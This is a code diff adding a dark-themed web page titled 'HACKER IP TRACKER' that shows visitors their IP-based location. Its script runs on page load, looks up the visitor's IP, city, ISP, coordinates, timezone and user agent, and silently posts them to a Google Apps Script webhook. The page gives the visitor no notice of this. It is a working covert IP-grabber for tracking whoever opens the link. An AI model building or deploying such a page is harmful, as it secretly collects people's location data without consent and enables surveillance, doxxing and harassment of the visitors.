@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HACKER IP SCAN</title>
+  <style>
+    :root {
+      --bg: #0f0f0f;
+      --green: #00ff99;
+      --light: #22ffcc;
+      --card: #1a1a1a;
+      --font: 'Fira Code', monospace;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--green);
+      font-family: var(--font);
+      padding: 20px;
+      margin: 0;
+    }
+
+    h1 {
+      text-align: center;
+      margin-bottom: 30px;
+      color: var(--light);
+      text-shadow: 0 0 5px var(--green);
+    }
+
+    .container {
+      display: grid;
+      gap: 20px;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+
+    .card {
+      background: var(--card);
+      padding: 20px;
+      border-left: 3px solid var(--green);
+      box-shadow: 0 0 10px rgba(0,255,150,0.2);
+      border-radius: 10px;
+    }
+
+    .label {
+      font-weight: bold;
+      color: var(--light);
+    }
+
+    .copy-btn {
+      float: right;
+      background: transparent;
+      color: var(--green);
+      border: 1px dashed var(--green);
+      padding: 3px 8px;
+      font-size: 0.8em;
+      cursor: pointer;
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 0.8em;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <h1>🛡️ HACKER IP TRACKER 🛡️</h1>
+  <div class="container" id="info"></div>
+
+  <footer>Powered by Đại ca ☠️</footer>
+
+  <script>
+    const webhookUrl = "https://script.google.com/macros/s/AKfycbzKKzCEv-FEhOtWfIfOCLVsl5FcHGzefod_LAYCcEBtW8cAg2xxWDH-o20YW-GPL-Zuvw/exec";
+
+    function copyText(text) {
+      navigator.clipboard.writeText(text);
+      alert('Đã copy: ' + text);
+    }
+
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        const info = document.getElementById("info");
+
+        const fields = {
+          "IP Address": data.ip,
+          "City": data.city,
+          "Country": data.country_name,
+          "ISP": data.org,
+          "Latitude": data.latitude,
+          "Longitude": data.longitude,
+          "Timezone": data.timezone,
+          "User Agent": navigator.userAgent
+        };
+
+        for (const key in fields) {
+          const value = fields[key];
+          const card = document.createElement("div");
+          card.className = "card";
+          card.innerHTML = `
+            <div class="label">${key}</div>
+            <div>${value}
+              <button class="copy-btn" onclick="copyText('${value}')">Copy</button>
+            </div>
+          `;
+          info.appendChild(card);
+        }
+
+        fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            ip: data.ip,
+            city: data.city,
+            country: data.country_name,
+            org: data.org,
+            latitude: data.latitude,
+            longitude: data.longitude,
+            timezone: data.timezone,
+            userAgent: navigator.userAgent
+          })
+        });
+      });
+  </script>
+</body>
+</html>
